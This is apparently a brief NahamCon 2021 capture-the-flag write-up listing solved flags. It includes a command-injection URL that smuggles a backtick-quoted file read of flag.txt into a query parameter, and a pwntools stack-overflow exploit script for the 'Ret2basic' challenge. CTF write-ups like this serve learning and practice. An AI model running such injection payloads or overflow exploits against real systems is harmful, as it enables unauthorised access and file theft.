# NahamCon CTF

#### Rules Source code
```flag{90bc54705794a62015369fd8e86e557b}```

### Nahamcon2021
```flag{e36bc5a67dd2fe5f33b62123f78fbcef}```

### Echo
http://challenge.nahamcon.com:30192/?echo=`%3C../flag.txt`

```flag{1beadaf44586ea4aba2ea9a00c5b6d91}```

### Homeward Bound

![image](https://user-images.githubusercontent.com/1076452/111000058-25d8db00-8360-11eb-9b99-3a045d6fd1f2.png)

![image](https://user-images.githubusercontent.com/1076452/111000087-30937000-8360-11eb-998c-07f49f530a66.png)

```flag{26080a2216e95746ec3e932002b9baa4}```

### Ret2basic

```
#!/usr/bin/python
from pwn import *
gs = '''
continue
'''
elf = context.binary = ELF('./ret2basic')
context.terminal = ['tmux', 'splitw', '-hp', '70']

def start():
    if args.GDB:
        return gdb.debug('./ret2basic', gdbscript=gs)
    if args.REMOTE:
        return remote('challenge.nahamcon.com', 30413)
    else:
        return process('./ret2basic')
r = start()
#========= exploit here ===================
win = 0x401215
#ret = 0x40133b
payload = "A" * 120
#payload += p64(ret)
payload += p64(win)
r.sendlineafter(": ",payload)

#========= interactive ====================
r.interactive()
```

![image](https://user-images.githubusercontent.com/1076452/111002592-810ccc80-8364-11eb-9f58-0ca4bb807ed0.png)

